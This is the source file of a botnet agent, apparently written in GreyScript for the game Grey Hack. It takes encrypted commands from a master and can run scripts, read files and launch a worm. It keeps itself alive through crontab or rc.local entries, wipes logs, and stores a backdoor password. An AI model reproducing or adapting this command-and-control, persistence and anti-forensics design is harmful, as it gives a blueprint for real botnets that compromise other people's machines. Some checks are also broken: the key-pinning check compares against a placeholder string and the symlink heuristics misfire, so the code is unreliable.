// ======================================
// slave.gs
// Bot agent: receives encrypted commands,
// executes, reports back to master
// Dependencies: kyber_lib.gs, lib_common.gs
// ======================================
import_code("/lib/kyber_lib.gs")
import_code("/lib/lib_common.gs")
import_code("/scripts/utils/config_manager.gs")
import_code("/scripts/utils/metrics.gs")
import_code("/scripts/utils/kyber_transport.gs")
import_code("/scripts/utils/forensics/persistence.gs")
import_code("/scripts/utils/accessLevel.gs")
import_code("/scripts/utils/parse_exploit_requirements.gs")
import_code("/scripts/utils/sanitize_ip.gs")
import_code("/scripts/utils/find_lib.gs")
import_code("/scripts/utils/forensics/watchdog_randomizer.gs")
import_code("/scripts/utils/botnet_config.gs")

// Initialize configuration
load_botnet_config()

// Use configuration values
CONFIG_DIR = get_config("paths.botnet_root")
PID_FILE = CONFIG_DIR + "/slave.pid"
VERSION = "1.0"
MASTER_PUBKEY_FILE = get_config("files.master_pub")
MY_PRIVKEY_FILE = get_config("files.slave_priv")
MY_PUBKEY_FILE = get_config("files.slave.pub")
COMMAND_DIR = CONFIG_DIR + "/commands"
RESPONSE_DIR = CONFIG_DIR + "/responses"

// ✅ NEW: Cache for master public key
globals.cached_master_pub = null

get_master_pub = function()
    if globals.cached_master_pub != null then
        return globals.cached_master_pub
    end if
    pub = read_file(MASTER_PUBKEY_FILE)
    if pub != null then
        globals.cached_master_pub = pub
    end if
    return pub
end function

// Bot UUID for unique identification
BOT_UUID_FILE = CONFIG_DIR + "/bot.uuid"
BOT_UUID = null

// ============================================
// Path validation: strict whitelist enforcement
// Prevents directory traversal attacks
// ============================================

// Explicit symlink detection (heuristic-based for GreyScript)
is_symlink = function(path)
    if path == null or path == "" then return false
    
    comp = get_shell.host_computer
    file = comp.File(path)
    if file == null then return false
    
    // GreyScript doesn't have file.is_symlink, so use heuristics
    // Check if file exists but has suspicious characteristics
    
    // Heuristic 1: Check if file name suggests it's a link
    suspicious_names = ["link", "ln", "sym", "shortcut", "ref"]
    filename = path.split("/")[-1]
    for name in suspicious_names
        if filename.indexOf(name) != null then
            return true
        end if
    end for
    
    // Heuristic 2: Check if file exists but parent directory doesn't contain it directly
    // This can indicate a symlink pointing elsewhere
    parent_path = path
    while parent_path != "/" and parent_path != ""
        last_slash = parent_path.lastIndexOf("/")
        if last_slash == null then break
        parent_path = parent_path[0 : last_slash]
        if parent_path == "" then parent_path = "/"
    end while
    
    parent_file = comp.File(parent_path)
    if parent_file != null and parent_file.is_folder then
        files = parent_file.get_files
        if files != null then
            found_directly = false
            for f in files
                if f != null and f.path == path then
                    found_directly = true
                    break
                end if
            end for
            if not found_directly then
                return true  // File exists but not directly in parent - likely symlink
            end if
        end if
    end if
    
    return false
end function

safe_path = function(path)
    if path == null or path == "" then return false
    if typeof(path) != "string" then return false
    
    // ============================================
    // STEP 1: Reject obvious dangerous patterns
    // ============================================
    if path.indexOf("../") == 0 then return false        // Starts with ../
    if path.indexOf("~") != null then return false        // Home directory ref
    if path.indexOf("$") != null then return false        // Environment var
    if path.indexOf("`") != null then return false        // Command substitution
    if path.indexOf("//") != null then return false       // Double slashes (bypass attempt)
    
    // Additional bypass attempts
    if path.indexOf("....") != null then return false     // Multiple dots
    if path.indexOf("%2e%2e") != null then return false  // URL encoded .. 
    if path.indexOf("%2E%2E") != null then return false  // URL encoded .. (uppercase)
    if path.indexOf("%2f") != null then return false     // URL encoded /
    if path.indexOf("%2F") != null then return false     // URL encoded / (uppercase)
    
    // ============================================
    // STEP 2: Recursive path normalization
    // ============================================
    normalized = path
    while true
        prev = normalized
        
        // Replace /./ with /
        normalized = normalized.replace("/./", "/")
        
        // Replace multiple consecutive dots followed by slash with single dot
        normalized = normalized.replace("/.../", "/")
        normalized = normalized.replace("/..../", "/")
        normalized = normalized.replace("/...../", "/")
        
        // Replace /../ with / (but only if not at start)
        // This handles cases like /foo/../bar -> /bar
        start_idx = normalized.indexOf("/../")
        while start_idx != null and start_idx > 0
            // Find the start of the directory before /../
            prev_slash = normalized.lastIndexOf("/", start_idx - 1)
            if prev_slash == null then
                // No previous slash, trying to escape root
                log_master("DEBUG: Path traversal rejected: " + path, "DEBUG")
                return false
            end if
            
            // Remove the directory and the /../
            before = normalized[0 : prev_slash]
            after = normalized[start_idx + 4 :]  // Skip "/../"
            normalized = before + after
            
            // Look for next occurrence
            start_idx = normalized.indexOf("/../")
        end while
        
        // Replace // with /
        normalized = normalized.replace("//", "/")
        
        // Remove trailing / if not root
        if normalized.len > 1 and normalized[-1] == "/" then
            normalized = normalized[0 : -1]
        end if
        
        // Exit if no changes made
        if prev == normalized then break
    end while
    
    // ============================================
    // STEP 3: Final validation against whitelist
    // ============================================
    if normalized == "" then
        return false  // Empty path after normalization
    end if
    
    // Ensure path starts with /
    if normalized[0] != "/" then
        normalized = "/" + normalized
    end if
    
    // ============================================
    // STEP 4: Symlink resolution check
    // ============================================
    
    // Check if path contains symlinks by resolving to real path
    comp = get_shell.host_computer
    check_file = comp.File(normalized)
    
    if check_file != null then
        // Explicit symlink detection
        if is_symlink(normalized) then
            log_master("WARNING: Symlink detected in path: " + normalized, "WARN")
            return false
        end if
        // For security, we need to resolve symlinks to their real paths
        // GreyScript doesn't have direct symlink resolution, so we use a heuristic
        real_path = normalized
        
        // Check common symlink locations and patterns
        dangerous_symlinks = [
            "/root/.botnet/etc",
            "/root/.botnet/root", 
            "/root/.botnet/home",
            "/root/.botnet/usr",
            "/root/.botnet/var",
            "/tmp/etc",
            "/tmp/root",
            "/tmp/home",
            "/tmp/usr",
            "/tmp/var"
        ]
        
        for symlink in dangerous_symlinks
            if real_path.indexOf(symlink) == 0 then
                log_master("DEBUG: Path contains suspicious symlink pattern: " + real_path, "DEBUG")
                return false
            end if
        end for
        
        // Additional check: if file exists but path seems to escape allowed dirs
        // This is a heuristic since GreyScript lacks lstat()
        parent_path = normalized
        while parent_path != "/" and parent_path != ""
            parent_file = comp.File(parent_path)
            if parent_file == null then break
            
            // Check if parent path points outside allowed directories
            is_allowed = false
            for prefix in ["/root/.botnet/", "/scripts/utils/", "/scripts/tools/", "/bin/", "/lib/", "/tmp/"]
                if parent_path.indexOf(prefix) == 0 then
                    is_allowed = true
                    break
                end if
            end for
            
            if not is_allowed then
                log_master("DEBUG: Path resolves outside allowed directories: " + parent_path, "DEBUG")
                return false
            end if
            
            // Move up one directory
            last_slash = parent_path.lastIndexOf("/")
            if last_slash == null then break
            parent_path = parent_path[0 : last_slash]
            if parent_path == "" then parent_path = "/"
        end while
    end if
    
    // WHITELIST approach: only allow known-safe prefixes
    allowed_prefixes = [
        "/root/.botnet/",
        "/scripts/utils/",
        "/scripts/tools/",
        "/bin/",
        "/lib/",
        "/tmp/"
    ]
    
    for prefix in allowed_prefixes
        if normalized == prefix then
            return true  // Exact match to allowed directory
        end if
        
        if normalized.indexOf(prefix) == 0 then
            // Starts with allowed prefix, check for boundary
            rest = normalized[prefix.len :]
            if rest.len == 0 then
                return true
            end if
            // Ensure next char is not part of prefix name (e.g., /root/.botnet-evil/)
            // This is guaranteed by the "/" boundary in prefix
            return true
        end if
    end for
    
    log_master("DEBUG: Path not in whitelist: " + normalized, "DEBUG")
    return false
end function

// Stricter validation for executed scripts (used in execute_command)
validate_script_executable = function(script_path)
    if not safe_path(script_path) then return false
    
    // Use configurable allowed scripts
    allowed_scripts = get_config("security.allowed_scripts")
    if allowed_scripts == null then
        // Fallback to hardcoded list if config fails
        allowed_scripts = [
            "/bin/slave.gs",
            "/bin/worm.gs",
            "/scripts/utils/forensics/wipe_logs.gs",
            "/scripts/utils/file_search.gs",
            "/scripts/utils/find_lib.gs",
            "/scripts/utils/accessLevel.gs"
        ]
    end if
    
    for allowed in allowed_scripts
        if script_path == allowed then return true
    end for
    
    return false
end function

// Validate command structure before execution (using shared library)
validate_command = function(cmd)
    return globals.validate_command(cmd)
end function

// ✅ NEW: Validate command structure BEFORE execution
validate_command_for_execution = function(cmd)
    if cmd == null or typeof(cmd) != "string" then return false

    parts = cmd.split(" ")
    if parts.len == 0 then return false

    // Whitelist allowed commands
    allowed_cmds = ["run", "kill", "update", "status", "clean", "worm", "read", "rotate"]
    if allowed_cmds.indexOf(parts[0]) == null then
        log_master("ERROR: Forbidden command: " + parts[0], "ERROR")
        return false
    end if

    // Validate 'run' command
    if parts[0] == "run" then
        if parts.len < 2 then return false
        script_path = parts[1]
        if not safe_path(script_path) then
            log_master("ERROR: Unsafe script path: " + script_path, "ERROR")
            return false
        end if
        if not validate_script_executable(script_path) then
            log_master("ERROR: Script not in whitelist: " + script_path, "ERROR")
            return false
        end if
    end if

    // Validate 'worm' command
    if parts[0] == "worm" then
        if parts.len < 3 then return false
        depth = parts[2].to_int
        if typeof(depth) != "number" or depth < 0 or depth > 10 then
            log_master("ERROR: Invalid depth: " + parts[2], "ERROR")
            return false
        end if
    end if

    // Validate 'read' command
    if parts[0] == "read" then
        if parts.len < 2 then return false
        file_path = parts[1]
        if not safe_path(file_path) then
            log_master("ERROR: Unsafe file path: " + file_path, "ERROR")
            return false
        end if
    end if

    return true
end function

// ============================================
// Kyber Migration with Rollback (Item 9)
// ============================================

migrate_backdoor_password = function(comp)
    backdoor_pass_file = CONFIG_DIR + "/backdoor_pass"
    backdoor_pass_enc = CONFIG_DIR + "/backdoor_pass.enc"
    backdoor_pass_backup = CONFIG_DIR + "/backdoor_pass.xor.bak"
    
    old_file = comp.File(backdoor_pass_file)
    if not old_file then
        // No old password file, nothing to migrate
        return true
    end if
    
    backdoor_pass = old_file.get_content
    if not backdoor_pass or backdoor_pass.len == 0 then
        // Empty password file
        old_file.delete
        return true
    end if
    
    log_master("Migrating backdoor password from XOR to Kyber...", "INFO")
    
    // Step 1: Decrypt the old XOR-encrypted password
    old_pass = null
    if backdoor_pass.len > 4 then
        old_pass = xor_obfuscate(backdoor_pass, "botnet_key_2026")
    else
        // Assume plaintext if very short
        old_pass = backdoor_pass
    end if
    
    if not old_pass or old_pass.len == 0 then
        log_master("ERROR: Failed to decrypt old backdoor password", "ERROR")
        return false
    end if
    
    // Step 2: Create backup of XOR version (rollback)
    if not safe_file_write(backdoor_pass_backup, backdoor_pass) then
        log_master("WARNING: Could not create backup of old password (continuing)", "WARN")
    end if
    
    // Step 3: Encrypt with Kyber
    if not store_password_kyber(backdoor_pass_enc, old_pass) then
        log_master("ERROR: Failed to store password with Kyber", "ERROR")
        log_master("Rolling back to XOR backup", "WARN")
        
        // Rollback: keep old XOR file
        return false
    end if
    
    // Step 4: Verify we can decrypt the new version
    verify_pass = retrieve_password_kyber(backdoor_pass_enc)
    if not verify_pass or verify_pass != old_pass then
        log_master("ERROR: Kyber migration verification failed", "ERROR")
        log_master("Rolling back to XOR backup", "WARN")
        
        // Rollback: delete new file, restore ability to use XOR
        new_file = comp.File(backdoor_pass_enc)
        if new_file then new_file.delete
        
        return false
    end if
    
    // Step 5: Only delete old file after successful verification
    if old_file.delete == "" then
        log_master("Backdoor password successfully migrated to Kyber", "SUCCESS")
        return true
    else
        log_master("WARNING: Could not delete old XOR file (both exist)", "WARN")
        return true  // Still consider migration successful
    end if
end function

// ============================================
// Complete Bot Cleanup Function
// ============================================

cleanup_bot_files = function()
    comp = get_shell.host_computer
    bot_files = [
        "/root/.botnet/slave.gs",
        "/root/.botnet/worm.gs", 
        "/root/.botnet/kyber_lib.gs",
        "/root/.botnet/lib_common.gs",
        "/root/.botnet/master.pub",
        "/root/.botnet/slave.priv",
        "/root/.botnet/slave.pub",
        "/root/.botnet/backdoors.txt",
        "/root/.botnet/backdoor_pass",
        "/root/.botnet/backdoor_pass.enc",
        "/root/.botnet/backdoor_pass.xor.bak",
        CONFIG_DIR + "/commands",
        CONFIG_DIR + "/responses",
        CONFIG_DIR + "/bot.uuid",
        PID_FILE
    ]
    
    for file_path in bot_files
        file = comp.File(file_path)
        if file != null then
            file.delete
        end if
    end for
    
    // Also clean from /bin/ and /lib/ if present
    system_files = [
        "/bin/slave.gs",
        "/bin/worm.gs",
        "/lib/kyber_lib.gs",
        "/lib/lib_common.gs"
    ]
    
    for file_path in system_files
        file = comp.File(file_path)
        if file != null then
            file.delete
        end if
    end for
    
    log_master("All bot files cleaned up", "INFO")
end function

// ============================================
// Slave initialization with Kyber migration rollback
// ============================================

slave_init = function()
    comp = get_shell.host_computer
    comp.create_folder("/root", ".botnet")
    comp.create_folder(CONFIG_DIR, "commands")
    comp.create_folder(CONFIG_DIR, "responses")
    comp.create_folder("/scripts", "utils")
    
    // Master public key pinning - prevent key substitution attacks
    master_pub = read_file(MASTER_PUBKEY_FILE)
    if master_pub != null then
        // Expected master public key hash (hardcoded for security)
        // In production, this should be replaced with actual expected key
        expected_pubkey_hash = "EXPECTED_MASTER_PUBKEY_SHA256"
        
        // Simple hash verification (GreyScript compatible)
        calculated_hash = ""
        for i in range(0, master_pub.len - 1)
            calculated_hash = calculated_hash + str(master_pub[i].code)
        end for
        calculated_hash = calculated_hash[0:32]  // Truncate to fixed size
        
        if calculated_hash != expected_pubkey_hash then
            log_master("CRITICAL: Master public key mismatch! Possible tampering.", "ERROR")
            log_master("Expected: " + expected_pubkey_hash, "ERROR")
            log_master("Got: " + calculated_hash, "ERROR")
            cleanup_bot_files()
            get_shell.close_program(get_shell.pid)
            return false
        end if
    end if
    
    priv = read_file(MY_PRIVKEY_FILE)
    if not priv then
        // Try Kyber key generation with rollback
        if not migrate_to_kyber() then
            log_master("CRITICAL: Kyber migration failed. Cleaning up bot files.", "ERROR")
            cleanup_bot_files()
            get_shell.close_program(get_shell.pid)
            return false
        end if
    end if
    
    setup_cron()
    // Clean up logs after startup
    wipe_logs()
    return true
end function

migrate_to_kyber = function()
    comp = get_shell.host_computer
    
    // Generate new Kyber keys
    keys = Kyber.generate_keypair()
    if keys == null or keys.private == null or keys.public == null then
        log_master("ERROR: Kyber key generation failed", "ERROR")
        return false
    end if
    
    // Save keys
    if not write_file(MY_PRIVKEY_FILE, keys.private) then
        log_master("ERROR: Failed to write private key", "ERROR")
        return false
    end if
    
    set_permissions(MY_PRIVKEY_FILE, "600")
    
    if not write_file(MY_PUBKEY_FILE, keys.public) then
        log_master("ERROR: Failed to write public key", "ERROR")
        // Rollback: delete private key
        comp.File(MY_PRIVKEY_FILE).delete
        return false
    end if
    
    set_permissions(MY_PUBKEY_FILE, "644")
    
    // Register with master
    master_pub = read_file(MASTER_PUBKEY_FILE)
    if master_pub then
        register_enc = Kyber.encrypt_message(master_pub, keys.public)
        if register_enc == null then
            log_master("ERROR: Failed to encrypt registration", "ERROR")
            // Rollback: delete keys
            comp.File(MY_PRIVKEY_FILE).delete
            comp.File(MY_PUBKEY_FILE).delete
            return false
        end if
        
        if not write_file(RESPONSE_DIR + "/register.enc", register_enc) then
            log_master("ERROR: Failed to write registration", "ERROR")
            // Rollback: delete keys
            comp.File(MY_PRIVKEY_FILE).delete
            comp.File(MY_PUBKEY_FILE).delete
            return false
        end if
        
        set_permissions(RESPONSE_DIR + "/register.enc", "600")
    end if
    
    // Migrate existing backdoor password to Kyber with rollback
    if not migrate_backdoor_password(comp) then
        log_master("ERROR: Backdoor password migration failed", "ERROR")
        // Rollback: delete keys
        comp.File(MY_PRIVKEY_FILE).delete
        comp.File(MY_PUBKEY_FILE).delete
        comp.File(RESPONSE_DIR + "/register.enc").delete
        return false
    end if
    
    log_master("Kyber migration completed successfully", "SUCCESS")
    return true
end function

// Legacy init function for compatibility
init = function()
    return slave_init()
end function

setup_cron = function()
    comp = get_shell.host_computer
    cron = comp.File("/etc/crontab")
    if cron == null then
        // Fallback: add to /etc/rc.local
        rc = comp.File("/etc/rc.local")
        if rc == null then return
        content = rc.get_content
        if content == null then return
        if content.indexOf("/bin/slave.gs") == null then
            rc.set_content(content.replace("exit 0", "/bin/slave.gs\nexit 0"))
            log_master("Added rc.local persistence", "INFO")
        end if
        return
    end if
    content = cron.get_content
    if content == null then return
    if content.indexOf("/bin/slave.gs") == null then
        cron.set_content(content + "@reboot root /bin/slave.gs\n")
        log_master("Added cron persistence", "INFO")
    end if
end function

process_commands = function()
    comp = get_shell.host_computer
    cmd_dir = comp.File(COMMAND_DIR)
    if cmd_dir == null then return
    for f in cmd_dir.get_files
        if f == null then continue
        if f.name[-4:] == ".enc" then
            cipher = f.get_content
            if cipher == null then continue
            priv = read_file(MY_PRIVKEY_FILE)
            if priv == null then continue
            cmd = Kyber.decrypt_message(priv, cipher)
            if cmd == null then continue
            
            // Validate command format before execution
            if not validate_command(cmd) then
                log_master("Invalid command format received, discarding", "WARN")
                f.delete
                continue
            end if
            
            result = execute_command(cmd)
            if result == null then continue
            pub = get_master_pub()  // ✅ Uses cache
            if pub == null then continue
            resp_enc = Kyber.encrypt_message(pub, result)
            if resp_enc == null then continue
            resp_dir = comp.File(RESPONSE_DIR)
            if resp_dir then
                write_file(RESPONSE_DIR + "/" + f.name, resp_enc)
                set_permissions(RESPONSE_DIR + "/" + f.name, "600")
            end if
            f.delete
        end if
    end for
end function

execute_command = function(cmd)
    // ✅ NEW: Validate before execution
    if not validate_command_for_execution(cmd) then
        return "ERROR|forbidden command"
    end if

    parts = cmd.split(" ")
    if parts.len == 0 then return "ERROR|empty command"
    
    if parts[0] == "run" then
        if parts.len < 2 then return "ERROR|missing script"
        script = parts[1]
        
        // Use stricter validation for scripts
        if not validate_script_executable(script) then
            return "ERROR|script not allowed"
        end if
        
        args = parts[2:]
        pid = get_shell.launch(script, args)
        return "RUNNING|" + pid
    
    else if parts[0] == "kill" then
        if parts.len < 2 then return "ERROR|missing script"
        script = parts[1]
        if not validate_script_executable(script) then
            return "ERROR|script not allowed"
        end if
        kill_all(script)
        return "KILLED|" + script
    
    else if parts[0] == "read" then
        if parts.len < 2 then return "ERROR|missing file"
        file_path = parts[1]
        
        // Use safe_path for file reads
        if not safe_path(file_path) then
            return "ERROR|access denied"
        end if
        
        f = get_shell.host_computer.File(file_path)
        if f then return "FILE|" + f.get_content
        return "ERROR|file not found"
    
    else if parts[0] == "update" then
        return "UPDATE_READY"
    else if parts[0] == "status" then
        level = accessLevel(get_shell)
        return "ALIVE|" + VERSION + "|" + level
    else if parts[0] == "clean" then
        wipe_logs()
        return "CLEANED"
    else if parts[0] == "worm" then
        if parts.len < 3 then return "ERROR|need master_pub_file and depth"
        // Validate master_pub_file path
        if not safe_path(parts[1]) then return "ERROR|access denied"
        // parts: [worm, master_pub_file, depth, master_ip]
        master_ip = ""
        if parts.len >= 4 then master_ip = parts[3]
        get_shell.launch("/bin/worm.gs", [parts[1], parts[2], master_ip, "0"])
        return "WORM_STARTED"
    else if parts[0] == "rotate" then
        if typeof(rotate_watchdog_names) == "function" then
            rotate_watchdog_names()
            return "ROTATED"
        else
            return "ERROR|watchdog_randomizer not available"
        end if
    else
        return "UNKNOWN_COMMAND"
    end if
end function

watchdog = function()
    if get_pids("slave.gs").len == 0 then
        get_shell.launch("/bin/slave.gs")
    end if
end function

main = function()
    init()
    write_file(PID_FILE, str(get_shell.pid))
    set_permissions(PID_FILE, "600")
    master_pub = read_file(MASTER_PUBKEY_FILE)
    my_ip = get_shell.host_computer.public_ip
    my_ip_safe = sanitize_ip(my_ip)
    if master_pub then
        write_file(RESPONSE_DIR + "/startup.enc", Kyber.encrypt_message(master_pub, "STARTUP|" + VERSION + "|" + my_ip_safe))
        set_permissions(RESPONSE_DIR + "/startup.enc", "600")
    end if
    // Periodic cleanup every hour
    last_clean = time
    while true
        process_commands()
        if time - last_clean > 3600 then
            wipe_logs()
            last_clean = time
        end if
        wait(5)
    end while
end function

if get_pids("slave.gs").len > 1 then
    print("Slave already running")
    exit()
else
    main()
end if
